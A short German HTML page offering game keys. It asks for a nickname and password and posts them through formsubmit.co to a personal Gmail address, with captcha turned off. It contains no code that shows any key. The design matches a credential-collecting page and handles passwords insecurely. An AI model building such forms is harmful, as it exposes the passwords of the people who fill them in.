<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spiele Key Vergabe</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Spiele Key Vergabe</h1>
    <p>Gib deinen Nickname und das Passwort ein, um den Key zu sehen. Nach dem Abruf erhältst du eine E-Mail.</p>
    <form action="https://formsubmit.co/feho87@gmail.com" method="POST">
        <!-- Formsubmit spezifische Felder -->
        <input type="hidden" name="_subject" value="Key abgerufen!">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">

        <!-- Eingabefelder -->
        <label for="spiel">Spiel:</label>
        <select id="spiel" name="spiel">
            <option value="Spiel 1">Spiel 1</option>
            <option value="Spiel 2">Spiel 2</option>
        </select><br><br>

        <label for="nickname">Dein Nickname:</label>
        <input type="text" id="nickname" name="nickname" placeholder="Nickname" required><br><br>

        <label for="password">Passwort:</label>
        <input type="password" id="password" name="password" placeholder="Passwort" required><br><br>

        <!-- Schlüsselanzeige -->
        <button type="submit">Key anzeigen und senden</button>
    </form>
</body>
</html>
